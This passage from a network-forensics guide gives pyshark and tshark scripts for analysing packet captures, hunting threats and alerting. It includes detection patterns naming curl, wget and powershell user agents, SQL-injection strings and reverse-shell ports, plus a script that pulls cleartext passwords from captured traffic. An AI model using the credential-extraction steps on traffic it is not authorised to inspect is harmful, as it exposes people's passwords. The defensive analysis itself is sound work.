**HTTP Analysis:**

```python
#!/usr/bin/env python3
import pyshark

def analyze_http_traffic(pcap_file):
    """Extract HTTP requests and responses"""
    cap = pyshark.FileCapture(pcap_file, display_filter='http')
    
    http_requests = []
    http_responses = []
    
    for packet in cap:
        try:
            if hasattr(packet, 'http'):
                # HTTP Request
                if hasattr(packet.http, 'request_method'):
                    http_requests.append({
                        'method': packet.http.request_method,
                        'uri': packet.http.request_uri if hasattr(packet.http, 'request_uri') else '',
                        'host': packet.http.host if hasattr(packet.http, 'host') else '',
                        'user_agent': packet.http.user_agent if hasattr(packet.http, 'user_agent') else '',
                        'src_ip': packet.ip.src,
                        'dst_ip': packet.ip.dst
                    })
                
                # HTTP Response
                if hasattr(packet.http, 'response_code'):
                    http_responses.append({
                        'code': packet.http.response_code,
                        'phrase': packet.http.response_phrase if hasattr(packet.http, 'response_phrase') else '',
                        'src_ip': packet.ip.src,
                        'dst_ip': packet.ip.dst
                    })
        
        except AttributeError:
            continue
    
    cap.close()
    
    # Print statistics
    print(f"Total HTTP Requests: {len(http_requests)}")
    print(f"Total HTTP Responses: {len(http_responses)}")
    
    print("\n=== Sample Requests ===")
    for req in http_requests[:5]:
        print(f"{req['method']} {req['host']}{req['uri']}")
        print(f"  From: {req['src_ip']}")
        print(f"  User-Agent: {req['user_agent'][:50]}")
    
    return http_requests, http_responses

# Usage
requests, responses = analyze_http_traffic('capture.pcap')
```

**DNS Analysis:**

```python
#!/usr/bin/env python3
import pyshark
from collections import Counter

def analyze_dns_traffic(pcap_file):
    """Extract and analyze DNS queries"""
    cap = pyshark.FileCapture(pcap_file, display_filter='dns')
    
    queries = []
    responses = []
    
    for packet in cap:
        try:
            if hasattr(packet, 'dns'):
                # DNS Query
                if hasattr(packet.dns, 'qry_name'):
                    queries.append({
                        'query': packet.dns.qry_name,
                        'type': packet.dns.qry_type if hasattr(packet.dns, 'qry_type') else '',
                        'src_ip': packet.ip.src
                    })
                
                # DNS Response
                if hasattr(packet.dns, 'a'):
                    responses.append({
                        'query': packet.dns.qry_name if hasattr(packet.dns, 'qry_name') else '',
                        'answer': packet.dns.a,
                        'src_ip': packet.ip.src
                    })
        
        except AttributeError:
            continue
    
    cap.close()
    
    # Statistics
    print(f"Total DNS Queries: {len(queries)}")
    print(f"Total DNS Responses: {len(responses)}")
    
    # Top queried domains
    query_counter = Counter([q['query'] for q in queries])
    print("\n=== Top 10 Queried Domains ===")
    for domain, count in query_counter.most_common(10):
        print(f"{domain}: {count}")
    
    return queries, responses

# Usage
queries, responses = analyze_dns_traffic('capture.pcap')
```

### Protocol Decoding

**TLS/SSL Analysis:**

```python
#!/usr/bin/env python3
import pyshark

def analyze_tls(pcap_file):
    """Analyze TLS handshakes"""
    cap = pyshark.FileCapture(pcap_file, display_filter='tls.handshake')
    
    handshakes = []
    
    for packet in cap:
        try:
            if hasattr(packet, 'tls'):
                handshake_info = {
                    'src_ip': packet.ip.src,
                    'dst_ip': packet.ip.dst
                }
                
                # Client Hello
                if hasattr(packet.tls, 'handshake_type') and packet.tls.handshake_type == '1':
                    handshake_info['type'] = 'ClientHello'
                    if hasattr(packet.tls, 'handshake_ciphersuite'):
                        handshake_info['ciphersuites'] = packet.tls.handshake_ciphersuite
                    if hasattr(packet.tls, 'handshake_extensions_server_name'):
                        handshake_info['sni'] = packet.tls.handshake_extensions_server_name
                
                # Server Hello
                elif hasattr(packet.tls, 'handshake_type') and packet.tls.handshake_type == '2':
                    handshake_info['type'] = 'ServerHello'
                    if hasattr(packet.tls, 'handshake_ciphersuite'):
                        handshake_info['selected_cipher'] = packet.tls.handshake_ciphersuite
                
                handshakes.append(handshake_info)
        
        except AttributeError:
            continue
    
    cap.close()
    
    # Print findings
    print(f"Total TLS Handshake Messages: {len(handshakes)}")
    
    for hs in handshakes[:10]:
        print(f"\n{hs.get('type', 'Unknown')}: {hs['src_ip']} -> {hs['dst_ip']}")
        if 'sni' in hs:
            print(f"  SNI: {hs['sni']}")
        if 'selected_cipher' in hs:
            print(f"  Cipher: {hs['selected_cipher']}")
    
    return handshakes

# Usage
handshakes = analyze_tls('capture.pcap')
```

### Packet Export

**Export Specific Packets:**

```python
#!/usr/bin/env python3
import pyshark

def export_filtered_packets(input_pcap, output_pcap, display_filter):
    """Export packets matching filter to new PCAP"""
    cap = pyshark.FileCapture(input_pcap, display_filter=display_filter, output_file=output_pcap)
    
    # Process to trigger export
    for packet in cap:
        pass
    
    cap.close()
    print(f"Exported packets to {output_pcap}")

# Usage
export_filtered_packets('capture.pcap', 'http_only.pcap', 'http')
export_filtered_packets('capture.pcap', 'dns_only.pcap', 'dns')
```

**Extract Objects:**

```python
#!/usr/bin/env python3
import pyshark
import os

def extract_http_files(pcap_file, output_dir):
    """Extract files transferred over HTTP"""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    cap = pyshark.FileCapture(pcap_file, display_filter='http')
    
    file_count = 0
    
    for packet in cap:
        try:
            if hasattr(packet, 'http') and hasattr(packet.http, 'file_data'):
                file_data = bytes.fromhex(packet.http.file_data.replace(':', ''))
                
                # Determine filename
                filename = f"file_{file_count}"
                if hasattr(packet.http, 'request_uri'):
                    uri_parts = packet.http.request_uri.split('/')
                    if uri_parts[-1]:
                        filename = uri_parts[-1]
                
                output_path = os.path.join(output_dir, filename)
                
                with open(output_path, 'wb') as f:
                    f.write(file_data)
                
                print(f"Extracted: {filename} ({len(file_data)} bytes)")
                file_count += 1
        
        except Exception as e:
            continue
    
    cap.close()
    print(f"\nTotal files extracted: {file_count}")

# Usage
# extract_http_files('capture.pcap', './extracted_files/')
```

### Statistics Generation

**Protocol Hierarchy:**

```python
#!/usr/bin/env python3
import pyshark
from collections import Counter

def generate_protocol_stats(pcap_file):
    """Generate protocol hierarchy statistics"""
    cap = pyshark.FileCapture(pcap_file)
    
    protocol_counter = Counter()
    total_packets = 0
    
    for packet in cap:
        total_packets += 1
        
        # Count each layer
        for layer in packet.layers:
            protocol_counter[layer.layer_name] += 1
    
    cap.close()
    
    print(f"Total Packets: {total_packets}")
    print("\n=== Protocol Distribution ===")
    for protocol, count in protocol_counter.most_common(20):
        percentage = (count / total_packets) * 100
        print(f"{protocol:20s}: {count:6d} ({percentage:5.2f}%)")
    
    return protocol_counter

# Usage
stats = generate_protocol_stats('capture.pcap')
```

**Conversation Statistics:**

```python
#!/usr/bin/env python3
import pyshark
from collections import defaultdict

def analyze_conversations(pcap_file):
    """Analyze network conversations"""
    cap = pyshark.FileCapture(pcap_file)
    
    conversations = defaultdict(lambda: {'packets': 0, 'bytes': 0})
    
    for packet in cap:
        try:
            if hasattr(packet, 'ip'):
                # Create conversation key (normalized)
                src, dst = packet.ip.src, packet.ip.dst
                if src > dst:
                    src, dst = dst, src
                
                conv_key = (src, dst)
                conversations[conv_key]['packets'] += 1
                conversations[conv_key]['bytes'] += int(packet.length)
        
        except AttributeError:
            continue
    
    cap.close()
    
    # Sort by packet count
    sorted_convs = sorted(conversations.items(), 
                         key=lambda x: x[1]['packets'], 
                         reverse=True)
    
    print("=== Top 10 Conversations by Packet Count ===")
    for (src, dst), stats in sorted_convs[:10]:
        print(f"{src} <-> {dst}")
        print(f"  Packets: {stats['packets']}")
        print(f"  Bytes: {stats['bytes']:,}")
    
    return conversations

# Usage
conversations = analyze_conversations('capture.pcap')
```

## Bash Scripting for Analysis

### Basic PCAP Analysis Scripts

**Quick PCAP Summary:**

```bash
#!/bin/bash
# pcap_summary.sh - Generate quick PCAP summary

PCAP="$1"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

echo "=== PCAP Summary: $PCAP ==="
echo ""

# Total packets
TOTAL=$(tshark -r "$PCAP" | wc -l)
echo "Total Packets: $TOTAL"

# Protocol distribution
echo ""
echo "=== Protocol Distribution ==="
tshark -r "$PCAP" -qz io,phs | grep -E "^\s+[A-Z]" | head -20

# Top talkers
echo ""
echo "=== Top 10 Source IPs ==="
tshark -r "$PCAP" -T fields -e ip.src | sort | uniq -c | sort -rn | head -10

echo ""
echo "=== Top 10 Destination IPs ==="
tshark -r "$PCAP" -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10

# Top ports
echo ""
echo "=== Top 10 Destination Ports ==="
tshark -r "$PCAP" -T fields -e tcp.dstport -e udp.dstport | \
    grep -v "^$" | sort | uniq -c | sort -rn | head -10
```

**HTTP Analysis Script:**

```bash
#!/bin/bash
# http_analyzer.sh - Analyze HTTP traffic

PCAP="$1"
OUTPUT_DIR="http_analysis"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "=== HTTP Traffic Analysis ==="

# Extract HTTP requests
echo "Extracting HTTP requests..."
tshark -r "$PCAP" -Y "http.request" -T fields \
    -e frame.time -e ip.src -e http.host -e http.request.method -e http.request.uri \
    -E header=y -E separator=, > "$OUTPUT_DIR/http_requests.csv"

echo "Saved to $OUTPUT_DIR/http_requests.csv"

# Extract HTTP responses
echo "Extracting HTTP responses..."
tshark -r "$PCAP" -Y "http.response" -T fields \
    -e frame.time -e ip.src -e http.response.code -e http.content_length \
    -E header=y -E separator=, > "$OUTPUT_DIR/http_responses.csv"

echo "Saved to $OUTPUT_DIR/http_responses.csv"

# Top requested hosts
echo ""
echo "=== Top 10 Requested Hosts ==="
tshark -r "$PCAP" -Y "http.host" -T fields -e http.host | \
    sort | uniq -c | sort -rn | head -10

# User agents
echo ""
echo "=== Unique User Agents ==="
tshark -r "$PCAP" -Y "http.user_agent" -T fields -e http.user_agent | \
    sort -u > "$OUTPUT_DIR/user_agents.txt"

cat "$OUTPUT_DIR/user_agents.txt"

# Export HTTP objects
echo ""
echo "Exporting HTTP objects..."
tshark -r "$PCAP" --export-objects http,"$OUTPUT_DIR/objects/"

echo "Complete! Results in $OUTPUT_DIR/"
```

**DNS Analysis Script:**

```bash
#!/bin/bash
# dns_analyzer.sh - Analyze DNS traffic

PCAP="$1"
OUTPUT_DIR="dns_analysis"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "=== DNS Traffic Analysis ==="

# Extract all DNS queries
echo "Extracting DNS queries..."
tshark -r "$PCAP" -Y "dns.flags.response == 0" -T fields \
    -e frame.time -e ip.src -e dns.qry.name -e dns.qry.type \
    -E header=y -E separator=, > "$OUTPUT_DIR/dns_queries.csv"

# Top queried domains
echo ""
echo "=== Top 20 Queried Domains ==="
tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name | \
    sort | uniq -c | sort -rn | head -20 | tee "$OUTPUT_DIR/top_domains.txt"

# Detect long queries (potential DNS tunneling)
echo ""
echo "=== Suspiciously Long DNS Queries (>50 chars) ==="
tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name | \
    awk 'length($0)>50 {print length($0), $0}' | sort -rn | \
    tee "$OUTPUT_DIR/long_queries.txt"

# NXDOMAIN responses
echo ""
echo "=== NXDOMAIN Count by Source IP ==="
tshark -r "$PCAP" -Y "dns.flags.rcode == 3" -T fields -e ip.src | \
    sort | uniq -c | sort -rn | head -10

# TXT record queries (potential covert channel)
echo ""
echo "=== TXT Record Queries ==="
tshark -r "$PCAP" -Y "dns.qry.type == 16" -T fields \
    -e ip.src -e dns.qry.name | tee "$OUTPUT_DIR/txt_queries.txt"

echo ""
echo "Complete! Results in $OUTPUT_DIR/"
```

### Automated Report Generation

**Comprehensive PCAP Report:**

```bash
#!/bin/bash
# generate_report.sh - Generate comprehensive PCAP analysis report

PCAP="$1"
REPORT="pcap_report_$(date +%Y%m%d_%H%M%S).txt"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

{
    echo "================================================"
    echo "      PCAP ANALYSIS REPORT"
    echo "================================================"
    echo "File: $PCAP"
    echo "Generated: $(date)"
    echo "================================================"
    echo ""
    
    # File info
    echo "=== File Information ==="
    ls -lh "$PCAP"
    file "$PCAP"
    echo ""
    
    # Capinfos
    echo "=== Capture Info ==="
    capinfos "$PCAP"
    echo ""
    
    # Total packets
    echo "=== Packet Count ==="
    TOTAL=$(tshark -r "$PCAP" 2>/dev/null | wc -l)
    echo "Total Packets: $TOTAL"
    echo # Time range

	echo "=== Time Range ==="
	tshark -r "$PCAP" -T fields -e frame.time | head -1
	tshark -r "$PCAP" -T fields -e frame.time | tail -1
	echo ""
	
	# Protocol hierarchy
	echo "=== Protocol Hierarchy ==="
	tshark -r "$PCAP" -qz io,phs
	echo ""
	
	# Top talkers
	echo "=== Top 10 Source IPs ==="
	tshark -r "$PCAP" -T fields -e ip.src 2>/dev/null | \
	    sort | uniq -c | sort -rn | head -10
	echo ""
	
	echo "=== Top 10 Destination IPs ==="
	tshark -r "$PCAP" -T fields -e ip.dst 2>/dev/null | \
	    sort | uniq -c | sort -rn | head -10
	echo ""
	
	# Port statistics
	echo "=== Top 10 TCP Destination Ports ==="
	tshark -r "$PCAP" -Y "tcp" -T fields -e tcp.dstport 2>/dev/null | \
	    sort | uniq -c | sort -rn | head -10
	echo ""
	
	echo "=== Top 10 UDP Destination Ports ==="
	tshark -r "$PCAP" -Y "udp" -T fields -e udp.dstport 2>/dev/null | \
	    sort | uniq -c | sort -rn | head -10
	echo ""
	
	# HTTP analysis
	HTTP_COUNT=$(tshark -r "$PCAP" -Y "http" 2>/dev/null | wc -l)
	if [ "$HTTP_COUNT" -gt 0 ]; then
	    echo "=== HTTP Traffic ($HTTP_COUNT packets) ==="
	    echo "Top HTTP Hosts:"
	    tshark -r "$PCAP" -Y "http.host" -T fields -e http.host 2>/dev/null | \
	        sort | uniq -c | sort -rn | head -10
	    echo ""
	    
	    echo "HTTP Methods:"
	    tshark -r "$PCAP" -Y "http.request.method" -T fields -e http.request.method 2>/dev/null | \
	        sort | uniq -c | sort -rn
	    echo ""
	    
	    echo "Response Codes:"
	    tshark -r "$PCAP" -Y "http.response.code" -T fields -e http.response.code 2>/dev/null | \
	        sort | uniq -c | sort -rn
	    echo ""
	fi
	
	# DNS analysis
	DNS_COUNT=$(tshark -r "$PCAP" -Y "dns" 2>/dev/null | wc -l)
	if [ "$DNS_COUNT" -gt 0 ]; then
	    echo "=== DNS Traffic ($DNS_COUNT packets) ==="
	    echo "Top 10 Queried Domains:"
	    tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name 2>/dev/null | \
	        sort | uniq -c | sort -rn | head -10
	    echo ""
	    
	    echo "NXDOMAIN Count:"
	    tshark -r "$PCAP" -Y "dns.flags.rcode == 3" 2>/dev/null | wc -l
	    echo ""
	fi
	
	# TLS/SSL analysis
	TLS_COUNT=$(tshark -r "$PCAP" -Y "tls" 2>/dev/null | wc -l)
	if [ "$TLS_COUNT" -gt 0 ]; then
	    echo "=== TLS/SSL Traffic ($TLS_COUNT packets) ==="
	    echo "Server Names (SNI):"
	    tshark -r "$PCAP" -Y "tls.handshake.extensions_server_name" \
	        -T fields -e tls.handshake.extensions_server_name 2>/dev/null | \
	        sort | uniq -c | sort -rn | head -10
	    echo ""
	fi
	
	# Conversation statistics
	echo "=== Top 10 Conversations ==="
	tshark -r "$PCAP" -qz conv,ip 2>/dev/null | \
	    grep -E "^[0-9]" | sort -k8 -rn | head -10
	echo ""
	
	# Endpoints
	echo "=== Top 10 Endpoints (by packets) ==="
	tshark -r "$PCAP" -qz endpoints,ip 2>/dev/null | \
	    grep -E "^[0-9]" | sort -k2 -rn | head -10
	echo ""
	
	echo "================================================"
	echo "Report generated: $REPORT"
	echo "================================================"

} | tee "$REPORT"

echo "" echo "Report saved to: $REPORT"
````

### Batch Processing Scripts

**Process Multiple PCAPs:**
```bash
#!/bin/bash
# batch_process.sh - Process multiple PCAP files

PCAP_DIR="$1"
OUTPUT_DIR="batch_results"

if [ -z "$PCAP_DIR" ]; then
    echo "Usage: $0 <pcap_directory>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "Processing PCAPs in: $PCAP_DIR"
echo "Output directory: $OUTPUT_DIR"
echo ""

# Process each PCAP
for pcap in "$PCAP_DIR"/*.pcap "$PCAP_DIR"/*.pcapng; do
    [ -f "$pcap" ] || continue
    
    basename=$(basename "$pcap")
    echo "Processing: $basename"
    
    # Create output subdirectory
    output_subdir="$OUTPUT_DIR/${basename%.*}"
    mkdir -p "$output_subdir"
    
    # Extract statistics
    {
        echo "=== $basename ==="
        echo "Processed: $(date)"
        echo ""
        
        # Packet count
        TOTAL=$(tshark -r "$pcap" 2>/dev/null | wc -l)
        echo "Total Packets: $TOTAL"
        
        # Protocol distribution
        echo ""
        echo "Protocol Distribution:"
        tshark -r "$pcap" -T fields -e _ws.col.Protocol 2>/dev/null | \
            sort | uniq -c | sort -rn
        
        # Top IPs
        echo ""
        echo "Top 5 Source IPs:"
        tshark -r "$pcap" -T fields -e ip.src 2>/dev/null | \
            sort | uniq -c | sort -rn | head -5
        
    } > "$output_subdir/summary.txt"
    
    # Extract HTTP if present
    HTTP_COUNT=$(tshark -r "$pcap" -Y "http" 2>/dev/null | wc -l)
    if [ "$HTTP_COUNT" -gt 0 ]; then
        tshark -r "$pcap" -Y "http" -T fields \
            -e ip.src -e http.host -e http.request.uri \
            > "$output_subdir/http_requests.txt" 2>/dev/null
    fi
    
    # Extract DNS if present
    DNS_COUNT=$(tshark -r "$pcap" -Y "dns" 2>/dev/null | wc -l)
    if [ "$DNS_COUNT" -gt 0 ]; then
        tshark -r "$pcap" -Y "dns.qry.name" -T fields -e dns.qry.name \
            > "$output_subdir/dns_queries.txt" 2>/dev/null
    fi
    
    echo "  -> Results in $output_subdir/"
done

# Generate master summary
echo ""
echo "Generating master summary..."

{
    echo "=== Batch Processing Summary ==="
    echo "Processed: $(date)"
    echo ""
    
    for summary in "$OUTPUT_DIR"/*/summary.txt; do
        cat "$summary"
        echo ""
        echo "---"
        echo ""
    done
} > "$OUTPUT_DIR/master_summary.txt"

echo "Complete! Master summary: $OUTPUT_DIR/master_summary.txt"
````

**Automated Threat Hunting Script:**

```bash
#!/bin/bash
# threat_hunt.sh - Automated threat hunting in PCAP

PCAP="$1"
OUTPUT="threat_hunt_$(date +%Y%m%d_%H%M%S).txt"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

{
    echo "================================================"
    echo "      THREAT HUNTING REPORT"
    echo "================================================"
    echo "PCAP: $PCAP"
    echo "Date: $(date)"
    echo "================================================"
    echo ""
    
    # Suspicious DNS queries
    echo "=== SUSPICIOUS DNS QUERIES ==="
    echo ""
    
    echo "Long domain names (>50 chars - potential DGA/tunneling):"
    tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name 2>/dev/null | \
        awk 'length($0)>50 {print length($0), $0}' | sort -rn | head -10
    echo ""
    
    echo "High query volume to single domain (>50 queries):"
    tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name 2>/dev/null | \
        sort | uniq -c | sort -rn | awk '$1>50 {print}'
    echo ""
    
    echo "TXT record queries (potential C2):"
    tshark -r "$PCAP" -Y "dns.qry.type == 16" -T fields \
        -e ip.src -e dns.qry.name 2>/dev/null | head -20
    echo ""
    
    # Suspicious HTTP
    echo "=== SUSPICIOUS HTTP TRAFFIC ==="
    echo ""
    
    echo "Non-standard User-Agents:"
    tshark -r "$PCAP" -Y "http.user_agent" -T fields -e http.user_agent 2>/dev/null | \
        grep -iE "(python|curl|wget|powershell|scanner|bot)" | sort -u
    echo ""
    
    echo "SQL Injection attempts:"
    tshark -r "$PCAP" -Y "http.request.uri" -T fields -e http.request.uri 2>/dev/null | \
        grep -iE "(union.*select|'.*or.*'|1=1|exec\()" | head -10
    echo ""
    
    echo "Directory traversal attempts:"
    tshark -r "$PCAP" -Y "http.request.uri" -T fields -e http.request.uri 2>/dev/null | \
        grep -E "\.\./|%2e%2e" | head -10
    echo ""
    
    echo "POST to suspicious paths:"
    tshark -r "$PCAP" -Y "http.request.method == POST" -T fields \
        -e ip.src -e http.host -e http.request.uri 2>/dev/null | \
        grep -iE "(shell|cmd|backdoor|upload)" | head -10
    echo ""
    
    # Port scanning indicators
    echo "=== PORT SCANNING INDICATORS ==="
    echo ""
    
    echo "IPs with high SYN count (>50):"
    tshark -r "$PCAP" -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
        -T fields -e ip.src 2>/dev/null | sort | uniq -c | sort -rn | awk '$1>50'
    echo ""
    
    echo "IPs contacting many different ports (>20):"
    tshark -r "$PCAP" -Y "tcp" -T fields -e ip.src -e tcp.dstport 2>/dev/null | \
        awk '{ports[$1][$2]++} END {for(ip in ports) if(length(ports[ip])>20) print ip, length(ports[ip])}' | \
        sort -k2 -rn
    echo ""
    
    # Large data transfers
    echo "=== LARGE DATA TRANSFERS ==="
    echo ""
    
    echo "Top 10 data senders (potential exfiltration):"
    tshark -r "$PCAP" -qz conv,ip 2>/dev/null | \
        grep -E "^[0-9]" | awk '{print $1, $9}' | sort -k2 -rn | head -10
    echo ""
    
    # Encrypted traffic to unusual ports
    echo "=== ENCRYPTED TRAFFIC ANOMALIES ==="
    echo ""
    
    echo "TLS on non-standard ports:"
    tshark -r "$PCAP" -Y "tls && tcp.port != 443 && tcp.port != 8443" \
        -T fields -e ip.src -e ip.dst -e tcp.dstport 2>/dev/null | head -10
    echo ""
    
    echo "Self-signed certificates:"
    tshark -r "$PCAP" -Y "tls.handshake.certificate" -V 2>/dev/null | \
        grep -i "issuer\|subject" | grep -A1 -B1 -i "self"
    echo ""
    
    # Beaconing detection
    echo "=== BEACONING DETECTION ==="
    echo ""
    
    echo "Regular connection intervals (potential C2):"
    # Extract connection times and look for patterns
    tshark -r "$PCAP" -Y "tcp.flags.syn == 1" -T fields \
        -e frame.time_relative -e ip.src -e ip.dst 2>/dev/null | \
        awk '{delta[$2" -> "$3]=delta[$2" -> "$3]" "$1} 
             END {for(pair in delta) {
                 split(delta[pair], times); 
                 if(length(times)>10) print pair, length(times), "connections"
             }}' | head -10
    echo ""
    
    # Suspicious protocols
    echo "=== UNUSUAL PROTOCOLS ==="
    echo ""
    
    echo "Non-standard protocols:"
    tshark -r "$PCAP" -T fields -e _ws.col.Protocol 2>/dev/null | \
        sort | uniq -c | sort -rn | \
        grep -vE "(TCP|UDP|DNS|HTTP|TLS|ARP|ICMP)" | head -10
    echo ""
    
    # External connections
    echo "=== EXTERNAL CONNECTIONS ==="
    echo ""
    
    echo "Unique external IPs contacted:"
    tshark -r "$PCAP" -Y "ip.dst" -T fields -e ip.dst 2>/dev/null | \
        grep -vE "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" | \
        sort -u | wc -l
    echo ""
    
    echo "Sample of external IPs:"
    tshark -r "$PCAP" -Y "ip.dst" -T fields -e ip.dst 2>/dev/null | \
        grep -vE "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" | \
        sort -u | head -20
    echo ""
    
    echo "================================================"
    echo "End of Threat Hunting Report"
    echo "================================================"
    
} | tee "$OUTPUT"

echo ""
echo "Report saved to: $OUTPUT"
```

### Real-Time Monitoring Scripts

**Live Traffic Monitor:**

```bash
#!/bin/bash
# live_monitor.sh - Real-time traffic monitoring

INTERFACE="${1:-eth0}"
DURATION="${2:-60}"  # seconds

echo "Monitoring $INTERFACE for $DURATION seconds..."
echo "Press Ctrl+C to stop"
echo ""

# Temporary PCAP
TEMP_PCAP="/tmp/live_capture_$$.pcap"

# Capture in background
tshark -i "$INTERFACE" -w "$TEMP_PCAP" -a duration:$DURATION &
CAPTURE_PID=$!

# Display live statistics
while kill -0 $CAPTURE_PID 2>/dev/null; do
    clear
    echo "=== Live Traffic Monitor ==="
    echo "Interface: $INTERFACE"
    echo "Duration: $DURATION seconds"
    echo "Time: $(date)"
    echo ""
    
    if [ -f "$TEMP_PCAP" ]; then
        TOTAL=$(tshark -r "$TEMP_PCAP" 2>/dev/null | wc -l)
        echo "Total Packets Captured: $TOTAL"
        echo ""
        
        echo "=== Top 5 Protocols ==="
        tshark -r "$TEMP_PCAP" -T fields -e _ws.col.Protocol 2>/dev/null | \
            sort | uniq -c | sort -rn | head -5
        echo ""
        
        echo "=== Top 5 Source IPs ==="
        tshark -r "$TEMP_PCAP" -T fields -e ip.src 2>/dev/null | \
            sort | uniq -c | sort -rn | head -5
        echo ""
        
        echo "=== Top 5 Destination Ports ==="
        tshark -r "$TEMP_PCAP" -T fields -e tcp.dstport -e udp.dstport 2>/dev/null | \
            grep -v "^$" | sort | uniq -c | sort -rn | head -5
    fi
    
    sleep 2
done

echo ""
echo "Capture complete: $TEMP_PCAP"
echo ""
echo "Generate full report? (y/n)"
read -r response

if [ "$response" = "y" ]; then
    ./pcap_summary.sh "$TEMP_PCAP"
fi

# Cleanup option
echo ""
echo "Delete temporary capture? (y/n)"
read -r response

if [ "$response" = "y" ]; then
    rm "$TEMP_PCAP"
    echo "Cleaned up temporary file"
fi
```

**Alert on Suspicious Activity:**

```bash
#!/bin/bash
# alert_monitor.sh - Monitor and alert on suspicious traffic

INTERFACE="${1:-eth0}"
ALERT_LOG="alerts_$(date +%Y%m%d_%H%M%S).log"

echo "Starting alert monitor on $INTERFACE"
echo "Alerts will be logged to: $ALERT_LOG"
echo ""

# Function to send alert
alert() {
    local msg="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] ALERT: $msg" | tee -a "$ALERT_LOG"
    
    # Optional: send notification (uncomment and configure)
    # echo "$msg" | mail -s "Traffic Alert" admin@example.com
}

# Monitor specific patterns
tshark -i "$INTERFACE" -Y "ip" -T fields \
    -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e _ws.col.Protocol \
    -l 2>/dev/null | \
while IFS=$'\t' read -r time src dst port proto; do
    
    # Alert on port scanning (many connections from single IP)
    if [ ! -z "$src" ]; then
        # Track connections per source
        echo "$src" >> /tmp/conn_track_$$.txt
        
        # Check if this IP has made >50 connections in last minute
        count=$(tail -100 /tmp/conn_track_$$.txt | grep -c "^$src$")
        if [ "$count" -gt 50 ]; then
            alert "Possible port scan from $src ($count connections)"
            # Clear to avoid repeated alerts
            > /tmp/conn_track_$$.txt
        fi
    fi
    
    # Alert on connections to suspicious ports
    case "$port" in
        4444|5555|6666|31337)
            alert "Connection to suspicious port $port: $src -> $dst"
            ;;
    esac
    
    # Alert on IRC protocol (potential botnet C2)
    if echo "$proto" | grep -qi "irc"; then
        alert "IRC traffic detected: $src -> $dst"
    fi
    
done

# Cleanup on exit
trap "rm -f /tmp/conn_track_$$.txt" EXIT
```

### Data Extraction Scripts

**Extract Credentials:**

```bash
#!/bin/bash
# extract_creds.sh - Extract potential credentials from PCAP

PCAP="$1"
OUTPUT_DIR="extracted_creds"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "=== Credential Extraction ==="
echo ""

# HTTP Basic Auth
echo "Searching for HTTP Basic Authentication..."
tshark -r "$PCAP" -Y "http.authorization" -T fields \
    -e ip.src -e http.host -e http.authorization 2>/dev/null | \
    while read src host auth; do
        if echo "$auth" | grep -q "Basic"; then
            decoded=$(echo "$auth" | sed 's/Basic //' | base64 -d 2>/dev/null)
            echo "Host: $host (from $src)"
            echo "  Credentials: $decoded"
        fi
    done | tee "$OUTPUT_DIR/http_basic_auth.txt"
echo ""

# FTP credentials
echo "Searching for FTP credentials..."
tshark -r "$PCAP" -Y "ftp.request.command == USER || ftp.request.command == PASS" \
    -T fields -e ip.src -e ftp.request.command -e ftp.request.arg 2>/dev/null | \
    tee "$OUTPUT_DIR/ftp_creds.txt"
echo ""

# SMTP Auth
echo "Searching for SMTP AUTH..."
tshark -r "$PCAP" -Y "smtp.req.command == AUTH" -T fields \
    -e ip.src -e smtp.req.parameter 2>/dev/null | \
    tee "$OUTPUT_DIR/smtp_auth.txt"
echo ""

# POP3 credentials
echo "Searching for POP3 credentials..."
tshark -r "$PCAP" -Y "pop.request.command == USER || pop.request.command == PASS" \
    -T fields -e ip.src -e pop.request.command -e pop.request.parameter 2>/dev/null | \
    tee "$OUTPUT_DIR/pop3_creds.txt"
echo ""

# Search for common password patterns in payloads
echo "Searching for password patterns in HTTP POST..."
tshark -r "$PCAP" -Y "http.request.method == POST" -T fields \
    -e http.file_data 2>/dev/null | \
    grep -iE "(password=|pwd=|pass=|passwd=)" | \
    tee "$OUTPUT_DIR/http_post_passwords.txt"
echo ""

echo "Results saved to $OUTPUT_DIR/"
```

**Extract Files from Network Traffic:**

```bash
#!/bin/bash
# extract_files.sh - Extract files from multiple protocols

PCAP="$1"
OUTPUT_DIR="extracted_files_$(date +%Y%m%d_%H%M%S)"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"/{http,smb,ftp,tftp}

echo "=== File Extraction ==="
echo "Output: $OUTPUT_DIR"
echo ""

# HTTP objects
echo "[+] Extracting HTTP objects..."
tshark -r "$PCAP" --export-objects http,"$OUTPUT_DIR/http/" 2>/dev/null
HTTP_COUNT=$(ls "$OUTPUT_DIR/http/" 2>/dev/null | wc -l)
echo "    Extracted $HTTP_COUNT HTTP objects"

# SMB objects
echo "[+] Extracting SMB objects..."
tshark -r "$PCAP" --export-objects smb,"$OUTPUT_DIR/smb/" 2>/dev/null
SMB_COUNT=$(ls "$OUTPUT_DIR/smb/" 2>/dev/null | wc -l)
echo "    Extracted $SMB_COUNT SMB objects"

# TFTP objects
echo "[+] Extracting TFTP objects..."
tshark -r "$PCAP" --export-objects tftp,"$OUTPUT_DIR/tftp/" 2>/dev/null
